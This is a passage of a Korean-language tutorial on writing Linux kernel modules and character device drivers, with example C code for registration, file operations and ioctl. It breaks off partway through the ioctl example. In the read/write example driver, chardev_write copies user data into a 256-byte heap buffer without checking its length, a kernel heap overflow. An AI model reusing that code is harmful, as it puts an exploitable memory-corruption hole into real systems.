로딩될때 호출되는 초기화 함수이다. cleanup_module은 rmmod를 통해서 모듈이 제거될때 호출되는 함수다. 이름과 상관없이 init, cleanup 함수를 작성할 수 있다. 뒤에서 더 알아볼 예정이다.\nprintk, log level printk()는 유저와 통신하기 위한 함수가 아니다. 이 함수가 호출되면 커널의 logging mechanism이 수행되고, 이 logging mechanism은 수행한 함수의 정보를 기록하거나 경고를 알린다. 각각의 printk 선언은 우선순위를 통해서 제공되는데 그 우선순위는 아래와 같다.\nName\nString\nAlias function\nKERN_EMERG\n“0”\npr_emerg()\nKERN_ALERT\n“1”\npr_alert()\nKERN_CRIT\n“2”\npr_crit()\nKERN_ERR\n“3”\npr_err()\nKERN_WARNING\n“4”\npr_warn()\nKERN_NOTICE\n“5”\npr_notice()\nKERN_INFO\n“6”\npr_info()\nKERN_DEBUG\n“7”\npr_debug() and pr_devel() if DEBUG is defined\nKERN_DEFAULT\n“”\nKERN_CONT\n“c”\npr_cont()\n따로 우선순위를 명시하지 않았다면, DEFAULT_MESSAGE_LOGEVEL이 사용된다. int_console_loglevel에 따라서 더 높은 심각도, 즉 log level이 낮은 경우에 로그가 터미널에 출력된다.\ncat /proc/sys/kernel/printk 다음을 통해서 현재 터미널의 default log level을 확인할 수 있다.\n4 4 1 7 일반적으로 다음과 같은 결과가 나올텐데, 이때 가장 앞에 4가 console_loglevel이다. console log level(여기선 4)보다 심각도가 높으면 콘솔에 출력된다.\nKbuild kbuild system은 리눅스 버젼 2.6.x대에 도입된 새로운 kernel build system이다. kbuild는 모든 복잡성을 숨길수 있는 간단한 하나의 makefile을 제공한다. 이 makefile을 사용해서 make로 module을 build 할 수 있다.\nGoal Goal을 정의하는 것은 Kbuild에서 가장 중요한 부분이다. Goal은 build 과정을 통해 최종적으로 만들어져야 할 것, 컴파일 옵션, 사용되야하는 하위 디렉토리를 정의한다. 간단한 kbuild makefile의 일부를 확인해보면 아래와 같다.\nobj-y += foo.o 위 구문이 의미하는 바는 디렉토리 내에 foo.o란 이름의 한개의 오브젝트가 있다는 것이다. 만약 모듈로 만든다면 obj-m이란 변수가 사용된다. 즉 아래와 같이 된다.\nobj-$(CONFIG_FOO) += foo.o $(CONFIG_FOO)는 y(built-in)나 m(module)의 값을 갖는다. 만약 CONFIG_FOO가 y나 m의 값을 갖지 않는다면 이 파일은 컴파일되거나 링크되지 않는다.\nKernel Module Compile 앞에 hello world 예제를 Makefile로 컴파일해보면 아래와 같다.\nobj-m += hello-1.o all: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules clean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean all과 clean은 단순 사용자의 편의를 위해 추가되었다고 볼 수 있다. make로 컴파일을 하면, .o가 대체된 .ko 확장자를 가진 파일이 생긴다.\ninsmod를 통해 해당 모듈을 적재할 수 있고, rmmod를 통해 제거할 수 있다. /var/log/messages를 살펴보면, hello world 로그가 찍힌 것을 확인할 수 있다.\nHello World - 2 init과 cleanup 함수를 재명명할 수 있다. 이때 module_init과 module_exit 매크로가 필요하다. 위 매크로들은 linux/init.h에 정의되어 있다. 예제는 다음과 같다.\n/* * hello-2.c - Demonstrating the module_init() and module_exit() macros. * This is preferred over using init_module() and cleanup_module(). */ #include \u0026lt;linux/module.h\u0026gt; /* Needed by all modules */ #include \u0026lt;linux/kernel.h\u0026gt; /* Needed for KERN_INFO */ #include \u0026lt;linux/init.h\u0026gt; /* Needed for the macros */ static int __init hello_2_init(void) { printk(KERN_INFO \u0026#34;Hello, world 2\\n\u0026#34;); return 0; } static void __exit hello_2_exit(void) { printk(KERN_INFO \u0026#34;Goodbye, world 2\\n\u0026#34;); } module_init(hello_2_init); module_exit(hello_2_exit); Modules VS Programs 프로그램들은 보통 Main 함수부터 시작된다. 하지만 커널 모듈은 항상 _init_module 혹은 module_init 같은 함수의 호출로 시작된다. 위와 같은 함수들을 entry function이라고 부른다. entry function은 모듈의 시작을 의미하는데, 기능적으로 모듈이 어떤 역할을 하는지, 필요로 할때 모듈이 작동될 수 있도록 커널을 설정하는 역할을 한다.\n수행되고 나서 cleanup_module 혹은 module_exit 의 이름으로 사용자가 구체화한 함수의 호출을 통해 종료된다. 이와 같은 종료 함수는 entry function이 수행한 모든 기능들을 수행하기 전으로 되돌린다.\nFunctions available to modules 일반적으로 프로그램을 작성할때, printf 같은 자신이 정의하지 않은 라이브러리 함수를 사용한다. 이때 printf 같은 라이브러리 함수들은 나중에 사용되기 위해서 linking을 거치게 된다.\n하지만 커널 모듈은 이런 부분에서 일반적인 프로그램과 다르다. 위에서 작성한 hello world 모듈을 예로 들어보면, printk 라는 라이브러리 함수를 사용했지만 실제로 I/O library를 include 하지 않았다. 그 이유는 모듈은 insmod가 수행되면서, printk와 같은 함수들의 symbol이 결정되는 object file이기 때문이다. 각 symbols의 함수적 정의는 커널이 제공한다. 이러한 symbol들은 /proc/kallsyms에서 확인할 수 있다.\nUser Space VS Kernel Space 커널은 유저에게 자원에 대한 접근 권한을 부여하지 않는다. 다음 사진은 인텔 기준으로 총 4개의 ring이 있다. OS가 CPU를 사용할때, 사용자가 CPU가 사용할때를 나눠놓았다. 별다른 의미는 없다. 라이브러리 함수도 자원에 액세스해야할때는 Kernel에게 요청한다. 그 요청을 syscall이라고 한다. syscall을 하면, Kernel에 그 syscall에 알맞는 처리를 해주고, 사용자에게 알려준다. 예를 들어 printf가 호출될때, printf는 format에 맞춘다던가 하는 처리를 해주고 결국 write syscall을 호출한다. 이때 커널이 superviser mode로 IO를 처리해주고, user mode로 돌아온다. printf 함수를 일종의 거대한 wrapper로 볼 수 있다.\nName Space C 프로그램을 작성할때, 일반적으로 프로그래머는 가독성을 보장하는 변수를 사용한다. 만약 다른 사람의 전역변수에 해당하는 전역변수명을 재사용한다면, namespace pollution 문제가 생긴다.\n커널에서 아주 작은 모듈이라고 할지라도 작성된 모듈이 커널 전체에 linking 될텐데 위 문제를 고려한다면 이것은 분명히 주목할만한 문제가 된다. 위 문제점을 피하기 위한 가장 좋은 방법은, 프로그래머만의 잘 정의된 prefix를 사용하고, 모두 static으로 정의하는 것이다.\nCode Space 프로세스가 만들어졌을때, 커널은 가상 메모리를 프로세스에게 할당한다. 그리고 프로세스를 위해 할당된 메모리 주소는 서로 겹치지 않는다. 예를 들어 각각의 프로세스들이 0xbffff978 라는 주소에 접근할때 실제로 접근하는 물리적 메모리의 주소는 다르다. 일종의 offset 개념으로 위와 같은 주소를 사용한다. 대부분의 경우 프로세스는 다른 프로세스의 메모리 영역에 접근하지 못한다.\n커널은 위 논리에 맞게 자신만의 메모리 영역을 가지고 있다. 모듈은 커널에 동적으로 탑재되고 제거될수 있으므로 각각의 모듈들은 자신만의 메모리보다 커널의 code space를 공유한다. 그래서 만약 어떤 모듈이 segfault 같은 에러를 발생시킨다면, kernel panic이 발생하게 된다.\nDevice drivers 드라이버는 모듈의 종류중 하나인데, 하드웨어를 위한 기능을 제공한다. 리눅스에서 VFS를 지원해서 통일되게 파일들을 다룰 수 있다. 각각의 하드웨어는 /dev에 위치해있는 파일 이름으로 나타내어질 수 있다. VFS 덕분에 간단하게 파일을 다루듯이 read, write 등의 연산을 통해서 하드웨어를 컨트롤 할 수 있다. application이 파일에 대한 IO를 수행하게 되면, 일반적으로 VFS는 inode 메타데이터를 확인해서 특정 파일시스템의 fops를 찾게 되며, 이 fops를 기반으로 read, write 등을 수행한다. 만약 device file이라면, major number를 통해 device driver를 찾는다. 이때 device driver의 초기화 과정에서 등록된 fops를 기반으로 호출하게 된다.\nMajor \u0026amp; Minor Numbers 다음 표는 3개의 IDE hard drive에 대한 정보가 나타나 있다.\n# ls -l /dev/hda[1-3] brw-rw---- 1 root disk 3, 1 Jul 5 2000 /dev/hda1 brw-rw---- 1 root disk 3, 2 Jul 5 2000 /dev/hda2 brw-rw---- 1 root disk 3, 3 Jul 5 2000 /dev/hda3 컴마 이후의 숫자는 장치의 major number를 나타낸다. 두번째 번호는 minor number를 나타낸다. major number는 어떤 드라이버가 하드웨어에 접근하기 위해 사용되는가를 나타낸다.\n각각의 드라이버는 고유의 major number가 부여되어있다. 만약 모든 major number가 같다면, 해당 major number가 부여된 장치들은 모두 같은 드라이버에 의해 컨트롤 됨을 나타낸다.\nminor number는 같은 드라이버에 의해 컨트롤되는 장치들을 구분하기 위한 용도로 사용된다.\nDevice files 장치들은 두가지 타입 : character device와 block device로 나뉜다.\nblock device와 character device의 가장 큰 차이점은 Application의 I/O 요구가 있을 시, 데이터를 File System에서 읽어오느냐 Character Device(Raw device)에서 읽어오느냐의 차이다.\nblock device는 System Buffer를 사용하여 블록이나 섹터 등의 정해진 단위로 데이터를 전송한다. hdd나 CD/DVD 같은 것들이 block device라고 볼 수 있다. I/O 전송 속도가 높은것이 특징이다.\ncharacter device는 block device와는 달리 buffer를 따로 사용하지 않는다. 그래서 output이 block device에 비해서 유동적이다. 버퍼 처리를 Application이 제어해서 속도도 Application에 따라서 다를 수 있다.\n# ls -l /dev/hda[1-3] brw-rw---- 1 root disk 3, 1 Jul 5 2000 /dev/hda1 brw-rw---- 1 root disk 3, 2 Jul 5 2000 /dev/hda2 brw-rw---- 1 root disk 3, 3 Jul 5 2000 /dev/hda3 character device와 block device는 가장 앞에 문자를 보고 알 수 있다. 여기선 모두 b로 block device이다. character device는 c로 표시된다.\n시스템에 설치된 모든 device 파일들은 mknod를 통해 생성되었다. major number가 12, minor number로 2를 가지는 coffee 라는 이름의 character device를 생성하기 위해서는 mknod /dev/coffee c 12 2를 입력하면 된다. 꼭 device file이 /dev에만 있어야 하는것은 아니지만 일반적으로 잘 관리하기 위해서 /dev에 많이 넣는다.\ndevice file에 어떤 장치가 접근하려 할때, 커널은 device file의 major number를 사용해서 어떤 드라이버가 해당 device file에 대한 접근을 제어하기 위해서 사용되는지 판단한다.\n즉, minor number는 커널에게 별 의미없는 숫자라고 말할 수 있다. 유일하게 드라이버가 minor number를 사용해 여러가지 하드웨어들을 구분한다. 여기서 하드웨어는 조금 추상적인 상태의 하드웨어를 의미한다. 다음 두개의 디바이스 파일을 살펴보자.\n% ls -l /dev/fd0 /dev/fd0u1680 brwxrwxrwx 1 root floppy 2, 0 Jul 5 2000 /dev/fd0 brw-rw---- 1 root floppy 2, 44 Jul 5 2000 /dev/fd0u1680 하나의 플로피 디스크를 넣더라도, 위와 같은 결과가 나올것이다. 그 이유는 하나의 플로피 디스크가 두 개의 서로 다른 minor number를 가지고 있기 때문이다. 위 예시 때문에 조금 추상적인 상태의 하드웨어라고 언급한 것이다.\nfile_operations structure file_operations 구조체는 /linux/fs.h에 정의되어있다. 구조체의 각각의 부분은 드라이버가 정의한 어떤 함수들의 주소에 대응된다.\n다음은 file_operations 구조체이다.\nstruct file_operations { struct module *owner; loff_t (*llseek) (struct file *, loff_t, int); ssize_t (*read) (struct file *, char __user *, size_t, loff_t *); ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *); ssize_t (*read_iter) (struct kiocb *, struct iov_iter *); ssize_t (*write_iter) (struct kiocb *, struct iov_iter *); int (*iterate) (struct file *, struct dir_context *); int (*iterate_shared) (struct file *, struct dir_context *); __poll_t (*poll) (struct file *, struct poll_table_struct *); long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long); long (*compat_ioctl) (struct file *, unsigned int, unsigned long); int (*mmap) (struct file *, struct vm_area_struct *); unsigned long mmap_supported_flags; int (*open) (struct inode *, struct file *); int (*flush) (struct file *, fl_owner_t id); int (*release) (struct inode *, struct file *); int (*fsync) (struct file *, loff_t, loff_t, int datasync); int (*fasync) (int, struct file *, int); int (*lock) (struct file *, int, struct file_lock *); ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int); unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long); int (*check_flags)(int); int (*setfl)(struct file *, unsigned long); int (*flock) (struct file *, int, struct file_lock *); ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int); ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int); int (*setlease)(struct file *, long, struct file_lock **, void **); long (*fallocate)(struct file *file, int mode, loff_t offset,loff_t len); void (*show_fdinfo)(struct seq_file *m, struct file *f); #ifndef CONFIG_MMU unsigned (*mmap_capabilities)(struct file *); #endif ssize_t (*copy_file_range)(struct file *, loff_t, struct file *, loff_t, size_t, unsigned int); int (*clone_file_range)(struct file *, loff_t, struct file *, loff_t, u64); ssize_t (*dedupe_file_range)(struct file *, u64, u64, struct file *, u64); } __randomize_layout; 드라이버가 구현하지 않는 몇몇 기능들도 존재한다. 그런 경우에는 진입점이 NULL로 세팅되어야 한다.\nstruct file_operations fops = { .read = device_read, .write = device_write, .open = device_open, .release = device_release }; 위와 같은 방식으로 사용할 수 있다.\nfile structure 각각의 디바이스들은 linux/fs.h에 정의된 커널의 file 구조체로 표현될 수 있다. 하지만 위의 구조체는 커널 수준에서 사용되므로 유저레벨의 사용 환경에선 확인할 수 없다. file 구조체의 객체는 보통 flip라고 불린다.\nRegistering a Device 시스템에 드라이버를 설치한다는 것은 커널에 등록을 해야한다는 것을 의미한다. 이 말은 모듈의 초기화 동안 major number를 드라이버에 할당한다는 것과 같은 의미이다.\nregister_chrdev() register_chrdev 함수를 보면 다음과 같다.\nint register_chrdev(unsigned int major, const char *name, struct file_operations *fops); 커널에 디바이스 드라이버의 major number를 등록한다.\n이때 minor number를 넘기지 않는 이유는 커널이 나중에 디바이스 파일을 이 major number를 보고 저기로 넘기기 때문이다. minor number는 그냥 device files를 만들때 필요하다. 드라이버가 처리하기 위해 fops 등록하는 역할이다.\n중복을 막기 위해서 register_chrdev 함수에 0을 전달하면, 커널은 동적으로 할당한 major number를 리턴한다.\nregister_chrdev()대신 요즘엔 register_chrdev_region, alloc_chrdev_region 들을 써서 minor number도 미리 예약한다. device 파일을 만들려면 major, minor를 다 지정해서 cdev_init/cdev_add 혹은 device_create같은 애들을 사용해서 직접 디바이스 파일을 생성해도된다.\ndev_t Device descriptor type. major, minor 번호가 조합되어있다.\nMAJOR(dev_t dev) MINOR(dev_t dev) MKDEV(int ma, int mi) linux/kdev_t.h에서 정의된 매크로를 확인할 수 있다.\n#define MINORBITS 20 #define MINORMASK ((1U \u0026lt;\u0026lt; MINORBITS) - 1) #define MAJOR(dev) ((unsigned int) ((dev) \u0026gt;\u0026gt; MINORBITS)) #define MINOR(dev) ((unsigned int) ((dev) \u0026amp; MINORMASK)) #define MKDEV(ma,mi) (((ma) \u0026lt;\u0026lt; MINORBITS) | (mi)) cdev 커널 내부적으로 char dev 표현할때 쓰는 구조체이다.\n/* include/linux/cdev.h */ struct cdev { struct kobject kobj; struct module *owner; const struct file_operations *ops; /* 디바이스에서 정의된 file_operations */ struct list_head list; /* cdev 리스트 */ dev_t dev; /* 디바이스 번호 (주번호와 부번호가 각각 저장되어있음) */ unsigned int count; } __randomize_layout; alloc_chrdev_region() alloc_chrdev_region() 은 동적으로 디바이스 번호 할당해주는 함수이다.\nint alloc_chrdev_region(dev_t *dev, unsigned int firstminor, unsigned int count, char* name) 원형은 위와 같다. 동적으로 할당해주기 때문에 미리 디바이스 파일을 못 만든다. /proc/devices 읽고 major number 얻어서 자동으로 등록하는 스크립트를 통해서 해결할 수 있긴 하다.\nregister_chrdev_region() int register_chrdev_region(dev_t first, unsigned int count, char *name); register_chrdev_region() 함수는 디바이스 번호 알고있으면 쓰는 함수다.\ncdev_init() void cdev_init(struct cdev * cdev, const struct file_operations * fops); cdev_init은 cdev 구조체 초기화 해주는 함수다.\ncdev_add() int cdev_add(struct cdev * p, dev_t dev, unsigned count); cdev_add 함수는 디바이스를 등록해주는 함수다.\nclass_create() struct class* class_create(struct module* owner, const char* name) class는 디바이스의 그룹이다. /sys/class 에서 클래스를 확인할 수 있다. 그룹을 나누기 위해 존재하는 것 같다.\ndevice_create() struct device* device_create(struct class* class, struct device parent, dev_t devt, const char* fmt, …) 장치를 생성한다. /dev에 아직 디바이스 파일이 안생겼으니, device_create 함수로 디바이스 파일을 생성할 수 있다.\nTHIS_MODULE #define THIS_MODULE (\u0026amp;__this_module) 이렇게 정의되어있다. 아래 모듈 구조체의 포인터라고 생각하면 된다.\nstruct module { enum module_state state; /* Member of list of modules */ struct list_head list; /* Unique handle for this module */ char name[MODULE_NAME_LEN]; /* Sysfs stuff. */ struct module_kobject mkobj; struct module_attribute *modinfo_attrs; const char *version; const char *srcversion; struct kobject *holders_dir; /* Exported symbols */ const struct kernel_symbol *syms; const s32 *crcs; unsigned int num_syms; /* Kernel parameters. */ #ifdef CONFIG_SYSFS struct mutex param_lock; #endif struct kernel_param *kp; unsigned int num_kp; /* GPL-only exported symbols. */ unsigned int num_gpl_syms; const struct kernel_symbol *gpl_syms; const s32 *gpl_crcs; #ifdef CONFIG_UNUSED_SYMBOLS /* unused exported symbols. */ const struct kernel_symbol *unused_syms; const s32 *unused_crcs; unsigned int num_unused_syms; /* GPL-only, unused exported symbols. */ unsigned int num_unused_gpl_syms; const struct kernel_symbol *unused_gpl_syms; const s32 *unused_gpl_crcs; #endif #ifdef CONFIG_MODULE_SIG /* Signature was verified. */ bool sig_ok; #endif bool async_probe_requested; /* symbols that will be GPL-only in the near future. */ const struct kernel_symbol *gpl_future_syms; const s32 *gpl_future_crcs; unsigned int num_gpl_future_syms; /* Exception table */ unsigned int num_exentries; struct exception_table_entry *extable; /* Startup function. */ int (*init)(void); /* Core layout: rbtree is accessed frequently, so keep together. */ struct module_layout core_layout __module_layout_align; struct module_layout init_layout; /* Arch-specific module values */ struct mod_arch_specific arch; unsigned long taints;\t/* same bits as kernel:taint_flags */ #ifdef CONFIG_GENERIC_BUG /* Support for BUG */ unsigned num_bugs; struct list_head bug_list; struct bug_entry *bug_table; #endif #ifdef CONFIG_KALLSYMS /* Protected by RCU and/or module_mutex: use rcu_dereference() */ struct mod_kallsyms *kallsyms; struct mod_kallsyms core_kallsyms; /* Section attributes */ struct module_sect_attrs *sect_attrs; /* Notes attributes */ struct module_notes_attrs *notes_attrs; #endif /* The command line arguments (may be mangled). People like keeping pointers to this stuff */ char *args; #ifdef CONFIG_SMP /* Per-cpu data. */ void __percpu *percpu; unsigned int percpu_size; #endif #ifdef CONFIG_TRACEPOINTS unsigned int num_tracepoints; struct tracepoint * const *tracepoints_ptrs; #endif #ifdef HAVE_JUMP_LABEL struct jump_entry *jump_entries; unsigned int num_jump_entries; #endif #ifdef CONFIG_TRACING unsigned int num_trace_bprintk_fmt; const char **trace_bprintk_fmt_start; #endif #ifdef CONFIG_EVENT_TRACING struct trace_event_call **trace_events; unsigned int num_trace_events; struct trace_eval_map **trace_evals; unsigned int num_trace_evals; #endif #ifdef CONFIG_FTRACE_MCOUNT_RECORD unsigned int num_ftrace_callsites; unsigned long *ftrace_callsites; #endif #ifdef CONFIG_LIVEPATCH bool klp; /* Is this a livepatch module? */ bool klp_alive; /* Elf information */ struct klp_modinfo *klp_info; #endif #ifdef CONFIG_MODULE_UNLOAD /* What modules depend on me? */ struct list_head source_list; /* What modules do I depend on? */ struct list_head target_list; /* Destruction function. */ void (*exit)(void); atomic_t refcnt; #endif #ifdef CONFIG_CONSTRUCTORS /* Constructor functions. */ ctor_fn_t *ctors; unsigned int num_ctors; #endif #ifdef CONFIG_FUNCTION_ERROR_INJECTION struct error_injection_entry *ei_funcs; unsigned int num_ei_funcs; #endif } ____cacheline_aligned __randomize_layout; 다음과 같은 모듈 구조체를 가리킨다. 말 그대로 THIS_MODULE이다.\n#include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; static int myinit(void) { /* Set by default based on the module file name. */ pr_info(\u0026#34;name = %s\\n\u0026#34;, THIS_MODULE-\u0026gt;name); pr_info(\u0026#34;version = %s\\n\u0026#34;, THIS_MODULE-\u0026gt;version); return 0; } static void myexit(void) {} module_init(myinit) module_exit(myexit) MODULE_VERSION(\u0026#34;1.0\u0026#34;); MODULE_LICENSE(\u0026#34;GPL\u0026#34;); 이런식으로 THIS_MODULE을 쓸 수 있다.\nExample fops - open #include \u0026lt;linux/init.h\u0026gt; #include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/types.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;linux/fs.h\u0026gt; #include \u0026lt;linux/cdev.h\u0026gt; #include \u0026lt;linux/sched.h\u0026gt; #include \u0026lt;linux/device.h\u0026gt; #include \u0026lt;linux/slab.h\u0026gt; #include \u0026lt;asm/current.h\u0026gt; #include \u0026lt;linux/uaccess.h\u0026gt; #define DEVICE_NAME \u0026#34;chardev\u0026#34; #define DEVICE_FILE_NAME \u0026#34;chardev\u0026#34; #define MAJOR_NUM 100 static int chardev_open(struct inode *inode, struct file *file) { printk(\u0026#34;chardev_open\u0026#34;); return 0; } struct file_operations chardev_fops = { .open = chardev_open, }; static int chardev_init(void) { int ret_val; ret_val = register_chrdev(MAJOR_NUM, DEVICE_NAME, \u0026amp;chardev_fops); if (ret_val \u0026lt; 0) { printk(KERN_ALERT \u0026#34;%s failed with %d\\n\u0026#34;, \u0026#34;Sorry, registering the character device \u0026#34;, ret_val); return ret_val; } printk(KERN_INFO \u0026#34;%s The major device number is %d.\\n\u0026#34;, \u0026#34;Registeration is a success\u0026#34;, MAJOR_NUM); printk(KERN_INFO \u0026#34;If you want to talk to the device driver,\\n\u0026#34;); printk(KERN_INFO \u0026#34;you\u0026#39;ll have to create a device file. \\n\u0026#34;); printk(KERN_INFO \u0026#34;We suggest you use:\\n\u0026#34;); printk(KERN_INFO \u0026#34;mknod %s c %d 0\\n\u0026#34;, DEVICE_FILE_NAME, MAJOR_NUM); printk(KERN_INFO \u0026#34;The device file name is important, because\\n\u0026#34;); printk(KERN_INFO \u0026#34;the ioctl program assumes that\u0026#39;s the\\n\u0026#34;); printk(KERN_INFO \u0026#34;file you\u0026#39;ll use.\\n\u0026#34;); return 0; } static void chardev_exit(void) { unregister_chrdev(MAJOR_NUM, DEVICE_NAME); } module_init(chardev_init); module_exit(chardev_exit); fops 구조체에 .open에 함수 주소를 따로 할당해놓고, device open시 커널 로그를 찍는 예제이다.\nExample fops - open, release, read, write #include \u0026lt;linux/init.h\u0026gt; #include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/types.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;linux/fs.h\u0026gt; #include \u0026lt;linux/cdev.h\u0026gt; #include \u0026lt;linux/sched.h\u0026gt; #include \u0026lt;linux/device.h\u0026gt; #include \u0026lt;linux/slab.h\u0026gt; #include \u0026lt;asm/current.h\u0026gt; #include \u0026lt;linux/uaccess.h\u0026gt; MODULE_LICENSE(\u0026#34;Dual BSD/GPL\u0026#34;); #define DRIVER_NAME \u0026#34;chardev\u0026#34; #define BUFFER_SIZE 256 static const unsigned int MINOR_BASE = 0; static const unsigned int MINOR_NUM = 2; static unsigned int chardev_major; static struct cdev chardev_cdev; static struct class *chardev_class = NULL; static int chardev_open(struct inode *, struct file *); static int chardev_release(struct inode *, struct file *); static ssize_t chardev_read(struct file *, char *, size_t, loff_t *); static ssize_t chardev_write(struct file *, const char *, size_t, loff_t *); struct file_operations chardev_fops = { .open = chardev_open, .release = chardev_release, .read = chardev_read, .write = chardev_write, }; struct data { unsigned char buffer[BUFFER_SIZE]; }; static int chardev_init(void) { int alloc_ret = 0; int cdev_err = 0; int minor; dev_t dev; printk(\u0026#34;The chardev_init() function has been called.\u0026#34;); alloc_ret = alloc_chrdev_region(\u0026amp;dev, MINOR_BASE, MINOR_NUM, DRIVER_NAME); if (alloc_ret != 0) { printk(KERN_ERR \u0026#34;alloc_chrdev_region = %d\\n\u0026#34;, alloc_ret); return -1; } //Get the major number value in dev. chardev_major = MAJOR(dev); dev = MKDEV(chardev_major, MINOR_BASE); //initialize a cdev structure cdev_init(\u0026amp;chardev_cdev, \u0026amp;chardev_fops); chardev_cdev.owner = THIS_MODULE; //add a char device to the system cdev_err = cdev_add(\u0026amp;chardev_cdev, dev, MINOR_NUM); if (cdev_err != 0) { printk(KERN_ERR \u0026#34;cdev_add = %d\\n\u0026#34;, alloc_ret); unregister_chrdev_region(dev, MINOR_NUM); return -1; } chardev_class = class_create(THIS_MODULE, \u0026#34;chardev\u0026#34;); if (IS_ERR(chardev_class)) { printk(KERN_ERR \u0026#34;class_create\\n\u0026#34;); cdev_del(\u0026amp;chardev_cdev); unregister_chrdev_region(dev, MINOR_NUM); return -1; } for (minor = MINOR_BASE; minor \u0026lt; MINOR_BASE + MINOR_NUM; minor++) { device_create(chardev_class, NULL, MKDEV(chardev_major, minor), NULL, \u0026#34;chardev%d\u0026#34;, minor); } return 0; } static void chardev_exit(void) { int minor; dev_t dev = MKDEV(chardev_major, MINOR_BASE); printk(\u0026#34;The chardev_exit() function has been called.\u0026#34;); for (minor = MINOR_BASE; minor \u0026lt; MINOR_BASE + MINOR_NUM; minor++) { device_destroy(chardev_class, MKDEV(chardev_major, minor)); } class_destroy(chardev_class); cdev_del(\u0026amp;chardev_cdev); unregister_chrdev_region(dev, MINOR_NUM); } static int chardev_open(struct inode *inode, struct file *file) { char *str = \u0026#34;helloworld\u0026#34;; int ret; struct data *p = kmalloc(sizeof(struct data), GFP_KERNEL); printk(\u0026#34;The chardev_open() function has been called.\u0026#34;); if (p == NULL) { printk(KERN_ERR \u0026#34;kmalloc - Null\u0026#34;); return -ENOMEM; } ret = strlcpy(p-\u0026gt;buffer, str, sizeof(p-\u0026gt;buffer)); if(ret \u0026gt; strlen(str)){ printk(KERN_ERR \u0026#34;strlcpy - too long (%d)\u0026#34;,ret); } file-\u0026gt;private_data = p; return 0; } static int chardev_release(struct inode *inode, struct file *file) { printk(\u0026#34;The chardev_release() function has been called.\u0026#34;); if (file-\u0026gt;private_data) { kfree(file-\u0026gt;private_data); file-\u0026gt;private_data = NULL; } return 0; } static ssize_t chardev_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) { struct data *p = filp-\u0026gt;private_data; printk(\u0026#34;The chardev_write() function has been called.\u0026#34;); printk(\u0026#34;Before calling the copy_from_user() function : %p, %s\u0026#34;,p-\u0026gt;buffer,p-\u0026gt;buffer); if (copy_from_user(p-\u0026gt;buffer, buf, count) != 0) { return -EFAULT; } printk(\u0026#34;After calling the copy_from_user() function : %p, %s\u0026#34;,p-\u0026gt;buffer,p-\u0026gt;buffer); return count; } static ssize_t chardev_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) { struct data *p = filp-\u0026gt;private_data; printk(\u0026#34;The chardev_read() function has been called.\u0026#34;); if(count \u0026gt; BUFFER_SIZE){ count = BUFFER_SIZE; } if (copy_to_user(buf, p-\u0026gt;buffer, count) != 0) { return -EFAULT; } return count; } module_init(chardev_init); module_exit(chardev_exit); IOCTL(input/output control) read, write 오퍼레이션을 통한 읽기 쓰기는 가능할지 몰라도, 하드웨어 제어 및 상태 정보 확인은 불가능하다. ioctl() 함수쓰면 하드웨어 제어가 가능하고, 상태 정보도 얻을 수 있다.\n#include \u0026lt;sys/ioctl.h\u0026gt; int ioctl(int d, int request, ...); 첫번째 인자는 fd, 두번째 인자는 디바이스에게 전달할 명령이다. 개발자의 필요에 따라 추가적인 인자를 생성할 수 있다.\n/usr/include/asm/ioctl.h 헤더파일에 ioctl의 커맨드 번호를 작성하는데 사용해야하는 매크로가 있다. rw에 대한 정보를 담아서 고유한 ioctl 식별자를 만드는걸 도와주기 위한 매크로라고 생각하면 된다.\nMacroDescriptionMacroDescription_IO(int type, int number)type, number 값만 전달하는 단순한 ioctl에 사용됩니다. _IOR(int type, int number, data_type)\u0026nbsp;디바이스 드라이버에서\u0026nbsp;데이터를 읽는 ioctl에 사용됩니다._IOW(int type, int number, data_type)디바이스 드라이버에서\u0026nbsp;데이터를 쓰는 ioctl에 사용됩니다._IORW(int type, int number, data_type)디바이스 드라이버에서 데이터를 쓰고 읽는 ioctl에 사용됩니다. type 디바이스 드라이버에 할당된 8비트 정수이다. number 8비트 정수이다. 디바이스 드라이버내에서 서비스하는 서로 다른 종류의 ioctl 명령마다 각기 다른 고유번호를 가지고 있어야한다. data_type 클라이언트와 드라이버간에 교환되는 바이트 수를 계산하는 데 사용되는 유형 이름이다. Example ioctl #include \u0026lt;linux/init.h\u0026gt; #include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/types.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;linux/fs.h\u0026gt; #include \u0026lt;linux/cdev.h\u0026gt; #include \u0026lt;linux/sched.h\u0026gt; #include \u0026lt;linux/device.h\u0026gt; #include \u0026lt;linux/slab.h\u0026gt; #include \u0026lt;asm/current.h\u0026gt; #include \u0026lt;linux/uaccess.h\u0026gt; #include \u0026#34;chardev.h\u0026#34; MODULE_LICENSE(\u0026#34;Dual BSD/GPL\u0026#34;); #define DRIVER_NAME \u0026#34;chardev\u0026#34; static const unsigned int MINOR_BASE = 0; static const unsigned int MINOR_NUM = 1; static unsigned int chardev_major; static struct cdev chardev_cdev; static struct class *chardev_class = NULL; static int chardev_open(struct inode *, struct file *); static int chardev_release(struct inode *, struct file *); static ssize_t chardev_read(struct file *, char *, size_t, loff_t *); static ssize_t chardev_write(struct file *, const char *, size_t, loff_t *); static long chardev_ioctl(struct file *, unsigned int, unsigned long); struct file_operations s_chardev_fops = { .open = chardev_open, .release = chardev_release, .read = chardev_read, .write = chardev_write, .unlocked_ioctl = chardev_ioctl, }; static int chardev_init(void) { int alloc_ret = 0; int cdev_err = 0; int minor = 0; dev_t dev; printk(\u0026#34;The chardev_init() function has been called.\u0026#34;); alloc_ret = alloc_chrdev_region(\u0026amp;dev, MINOR_BASE, MINOR_NUM, 